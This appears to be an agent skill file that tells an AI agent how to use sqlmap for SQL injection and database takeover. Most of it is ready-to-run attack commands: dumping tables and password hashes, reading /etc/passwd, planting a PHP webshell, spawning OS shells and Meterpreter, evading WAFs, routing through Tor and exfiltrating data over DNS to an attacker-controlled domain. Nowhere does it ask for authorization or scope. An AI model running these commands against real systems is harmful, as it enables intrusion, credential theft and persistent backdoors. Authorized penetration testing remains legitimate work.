---
name: sqlmap
description: >
  Operate sqlmap for automatic SQL injection detection and database takeover. Use when
  the user needs to test for SQL injection, enumerate database contents, extract tables
  and data, obtain OS shells or file read/write access, bypass WAFs with tamper scripts,
  or integrate with Burp Suite saved requests. Covers detection techniques, injection
  types (boolean, time, error, union, stacked), all enumeration flags, second-order
  injection, tamper scripting, request customization, and advanced evasion.
  Source: https://github.com/sqlmapproject/sqlmap
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/sqlmapproject/sqlmap
  stars: '36995'
---

# sqlmap Agent Skill

## When to Use This Skill

Use this skill when:
- Testing a web application for SQL injection vulnerabilities
- Enumerating database contents (schemas, tables, columns, rows) after finding SQLi
- Extracting credentials or sensitive data from a database
- Gaining OS-level shell access via `--os-shell` on a vulnerable database server
- Bypassing WAF/IDS protections with tamper scripts
- Replaying a Burp Suite saved request file for injection testing
- Testing second-order injection or injections in non-obvious parameters

## What sqlmap Is

sqlmap is an open-source Python tool that automates the detection and exploitation of
SQL injection vulnerabilities. It supports all major database backends (MySQL, MSSQL,
Oracle, PostgreSQL, SQLite, MariaDB, IBM DB2, Sybase, and more), implements six
injection techniques, and can escalate from SQLi to full OS command execution when
database permissions allow it. It is the standard tool for confirming and exploiting
SQL injection after manual discovery.

## Installation

```bash
# Kali / Parrot (pre-installed)
sqlmap --version

# From source (latest)
git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python3 sqlmap.py --version

# pip
pip install sqlmap
sqlmap --version

# Docker
docker pull sqlmapproject/sqlmap
docker run -it sqlmapproject/sqlmap -u "http://target/?id=1"
```

## Core Concepts

### Injection Techniques

```
B — Boolean-based blind:  inject true/false conditions, infer data bit-by-bit
T — Time-based blind:     use SLEEP/WAITFOR to infer data via response timing
E — Error-based:          extract data from database error messages
U — Union-based:          UNION SELECT to append extra rows in response
S — Stacked queries:      inject multiple statements (;DROP, ;EXEC) where supported
Q — Inline queries:       correlated subquery injection
```

### Detection Aggressiveness

```
--level   1-5   (default 1) — number of parameters tested; higher = more thorough
--risk    1-3   (default 1) — payload risk; 2 adds heavy time-based, 3 adds OR-based
                             (risk 3 can modify data — use carefully)
```

## Basic Usage

```bash
# Minimum viable test (GET parameter)
sqlmap -u "http://target/item?id=1"

# Specify parameter
sqlmap -u "http://target/item?id=1&cat=2" -p id

# POST parameter
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p user

# Cookie injection
sqlmap -u "http://target/profile" --cookie="session=abc123; uid=5" -p uid

# HTTP header injection (User-Agent, Referer, custom header)
sqlmap -u "http://target/" --headers="X-Forwarded-For: *"
sqlmap -u "http://target/" --user-agent="sqlmap*"

# Force HTTPS and follow redirects
sqlmap -u "https://target/item?id=1" --follow-redirects

# Specify technique(s) to use
sqlmap -u "http://target/?id=1" --technique=BEUSTQ   # all
sqlmap -u "http://target/?id=1" --technique=T        # time-based only (stealthy)
sqlmap -u "http://target/?id=1" --technique=EU       # error + union

# Set threads and delay
sqlmap -u "http://target/?id=1" --threads=5 --delay=0.5
```

## Detection Tuning

```bash
# Increase coverage (catch harder injections)
sqlmap -u "http://target/?id=1" --level=5 --risk=2

# Force specific DBMS (skip detection, speeds up scan)
sqlmap -u "http://target/?id=1" --dbms=mysql
sqlmap -u "http://target/?id=1" --dbms=mssql
sqlmap -u "http://target/?id=1" --dbms=postgresql

# Specify injection prefix/suffix manually
sqlmap -u "http://target/?id=1" --prefix="'" --suffix="--"

# Provide a known true/false string for boolean-based verification
sqlmap -u "http://target/?id=1" --string="Welcome"   # string present when true
sqlmap -u "http://target/?id=1" --not-string="Error" # string absent when false
sqlmap -u "http://target/?id=1" --code=200           # HTTP code for true condition

# Second-order injection (inject in one endpoint, trigger in another)
sqlmap -u "http://target/register" --data="username=*&email=a@b.com" \
  --second-url="http://target/profile"
```

## Database Enumeration

```bash
# List databases
sqlmap -u "http://target/?id=1" --dbs

# List tables in a database
sqlmap -u "http://target/?id=1" -D webapp --tables

# List columns in a table
sqlmap -u "http://target/?id=1" -D webapp -T users --columns

# Dump a specific table
sqlmap -u "http://target/?id=1" -D webapp -T users --dump

# Dump specific columns
sqlmap -u "http://target/?id=1" -D webapp -T users -C username,password --dump

# Dump all databases (use carefully — can be very large)
sqlmap -u "http://target/?id=1" --dump-all

# Exclude system databases from dump
sqlmap -u "http://target/?id=1" --dump-all --exclude-sysdbs

# Current DB, user, hostname
sqlmap -u "http://target/?id=1" --current-db
sqlmap -u "http://target/?id=1" --current-user
sqlmap -u "http://target/?id=1" --hostname

# Check DBA privilege
sqlmap -u "http://target/?id=1" --is-dba

# List database users and password hashes
sqlmap -u "http://target/?id=1" --users
sqlmap -u "http://target/?id=1" --passwords      # auto-cracks with wordlist
sqlmap -u "http://target/?id=1" --privileges     # user privileges
sqlmap -u "http://target/?id=1" --roles          # Oracle roles
```

## File Read / Write

```bash
# Read a file (requires FILE privilege on MySQL, or DBA on others)
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target/?id=1" --file-read="C:\\Windows\\System32\\drivers\\etc\\hosts"

# Write a file (requires write privileges on target path)
sqlmap -u "http://target/?id=1" \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/shell.php"

# Shell content example
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
sqlmap -u "http://target/?id=1" \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/cmd.php"
# Then access: http://target/cmd.php?cmd=id
```

## OS Shell

```bash
# Attempt to spawn interactive OS shell via database
# MySQL: uses SELECT INTO OUTFILE to write a UDF or webshell
# MSSQL: uses xp_cmdshell
# PostgreSQL: uses COPY TO/FROM and pg_exec
sqlmap -u "http://target/?id=1" --os-shell

# Provide web server document root if prompted
# > /var/www/html

# Non-interactive OS command execution
sqlmap -u "http://target/?id=1" --os-cmd="id"

# Upgrade to full Meterpreter session
sqlmap -u "http://target/?id=1" --os-pwn        # attempts Meterpreter
sqlmap -u "http://target/?id=1" --os-bof        # stack buffer overflow attempt (MSSQL)
```

## Burp Suite Integration

```bash
# Method 1: Save request from Burp (right-click > "Save item") → use with -r
sqlmap -r /tmp/burp_request.txt

# Method 2: Use Burp as HTTP proxy
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080"

# Method 3: Mark injection point in saved request with *
# Edit request file:  GET /item?id=1* HTTP/1.1
sqlmap -r /tmp/burp_request.txt   # sqlmap detects * as injection point

# Burp request file format:
# POST /login HTTP/1.1
# Host: target
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc
#
# user=admin*&pass=test
```

## Tamper Scripts (WAF Bypass)

```bash
# List available tamper scripts
sqlmap --list-tampers

# Commonly used tamper scripts:
# space2comment     — replace spaces with /**/
# charencode        — URL-encode all chars
# chardoubleencode  — double URL-encode
# between           — replace > with BETWEEN x AND y
# randomcase        — RaNdOmCaSe SQL keywords
# base64encode      — encode payload in base64 (use with DB-specific decode function)
# equaltolike       — replace = with LIKE
# ifnull2ifisnull   — replace IFNULL with IF(ISNULL())
# modsecurityversioned — add versioned MySQL comment around keywords
# greatest          — replace > with GREATEST(a,b)
# apostrophemask    — replace ' with UTF-8 full-width apostrophe

# Combine multiple tampers (comma-separated)
sqlmap -u "http://target/?id=1" \
  --tamper=space2comment,charencode,randomcase

# WAF bypass combination for ModSecurity / Cloudflare
sqlmap -u "http://target/?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent \
  --delay=1 \
  --level=3 --risk=2

# Write custom tamper script (~/.sqlmap/tamper/mytamper.py)
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    # Replace space with %09 (tab)
    return payload.replace(' ', '%09') if payload else payload
```

## Request Customization

```bash
# Authentication
sqlmap -u "http://target/?id=1" \
  --auth-type=Basic --auth-cred="admin:password"

# Cookie / session token
sqlmap -u "http://target/search?q=1" \
  --cookie="PHPSESSID=abc123; role=user"

# Custom headers (e.g., Bearer token, X-CSRF-Token)
sqlmap -u "http://target/api/item?id=1" \
  --headers="Authorization: Bearer eyJ...\nX-CSRF-Token: abc"

# Custom User-Agent
sqlmap -u "http://target/?id=1" \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
sqlmap -u "http://target/?id=1" --random-agent   # pick random known UA

# JSON body injection
sqlmap -u "http://target/api/search" \
  --data='{"query":"test","id":"1*"}' \
  --content-type="application/json"

# XML body injection
sqlmap -u "http://target/api" \
  --data='<id>1*</id>' \
  --content-type="application/xml"

# Multipart / file upload parameter
sqlmap -u "http://target/upload" \
  --data="file=test&id=1*" \
  --multipart
```

## Output and Logging

```bash
# Save results to directory
sqlmap -u "http://target/?id=1" --output-dir=/tmp/sqlmap_results

# Verbosity levels (0-6; default 1)
sqlmap -u "http://target/?id=1" -v 3   # show injection payloads
sqlmap -u "http://target/?id=1" -v 6   # show full HTTP request/response

# Dump to CSV
sqlmap -u "http://target/?id=1" -D webapp -T users --dump \
  --dump-format=CSV

# Resume interrupted session (auto-detected from session file in output dir)
sqlmap -u "http://target/?id=1" --resume

# Flush session (start fresh)
sqlmap -u "http://target/?id=1" --flush-session
```

## Common Engagement Workflows

### Confirm SQLi Found Manually

```bash
# You found: GET /item?id=1' → error response
# Confirm and extract DB:
sqlmap -u "http://target/item?id=1" \
  --dbms=mysql \
  --technique=EU \
  --level=2 \
  --current-db \
  --batch    # non-interactive; accept defaults
```

### Full Database Dump from Burp Request

```bash
# Save request from Burp as /tmp/req.txt, mark SQLi param with *
sqlmap -r /tmp/req.txt \
  --dbs \
  --batch \
  --random-agent \
  -v 2

# Once DB identified:
sqlmap -r /tmp/req.txt \
  -D target_db --tables --batch

sqlmap -r /tmp/req.txt \
  -D target_db -T users --dump --batch
```

### MSSQL to RCE via xp_cmdshell

```bash
# Step 1: Confirm MSSQL and DBA
sqlmap -u "http://target/?id=1" --dbms=mssql --is-dba --batch

# Step 2: Enable xp_cmdshell and get OS shell
sqlmap -u "http://target/?id=1" --dbms=mssql --os-shell

# If xp_cmdshell is disabled, sqlmap enables it automatically
# Alternatively via stacked queries:
sqlmap -u "http://target/?id=1" \
  --dbms=mssql \
  --technique=S \
  --os-cmd="powershell -c whoami"
```

### Evade CloudFlare WAF

```bash
sqlmap -u "http://target/?id=1" \
  --tamper=space2comment,charencode,randomcase,greatest \
  --random-agent \
  --delay=2 \
  --retries=3 \
  --threads=1 \
  --technique=T \     # time-based only — most evasive
  --level=1 \
  --risk=1 \
  --batch
```

### Second-Order Injection

```bash
# Inject in registration endpoint, trigger when profile is loaded
sqlmap -u "http://target/register" \
  --data="username=*&email=a@b.com&pass=test" \
  --second-url="http://target/profile" \
  --second-req=/tmp/second_req.txt \   # or use saved request
  --dbms=mysql \
  --level=3 \
  --batch
```

## Advanced Techniques

```bash
# WAF detection and fingerprint
sqlmap -u "http://target/?id=1" --identify-waf

# Use Tor for anonymity (requires Tor running on 9050)
sqlmap -u "http://target/?id=1" --tor --tor-type=SOCKS5 --check-tor

# DNS exfiltration for blind injection (no HTTP response needed)
# Requires a DNS server you control (Burp Collaborator or interactsh)
sqlmap -u "http://target/?id=1" \
  --dns-domain=attacker.burpcollaborator.net

# Pivoting through a compromised proxy
sqlmap -u "http://10.10.11.5/?id=1" \
  --proxy="socks5://127.0.0.1:1080"   # Metasploit SOCKS proxy

# Enumerate and crack hashes automatically
sqlmap -u "http://target/?id=1" --passwords

# Test all GET parameters at once
sqlmap -u "http://target/search?q=test&cat=1&sort=name" --level=2
```

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---|---|---|
| "No injectable parameters" | Low level/risk or WAF | Increase `--level`/`--risk`; add `--tamper` |
| All tests return HTTP 403 | WAF blocking | Use `--random-agent`, `--delay`, and tamper scripts |
| Time-based very slow | High network latency | Increase `--time-sec` (default 5) to e.g. 10 |
| Dump output is empty | Wrong column names | Use `--columns` first to verify schema |
| `--os-shell` fails | No write permission / low privs | Verify `--is-dba`; try `--file-write` to web root |
| JSON parameter not injected | Content-Type mismatch | Add `--content-type="application/json"` |
| Session reuses stale data | Old session file | Add `--flush-session` |
| HTTPS cert error | Self-signed cert | Add `--ignore-ssl` |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [Why Your Penetration Test Report Is Useless (And What to Ask For Instead)](https://redhound.us/pentest-report)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
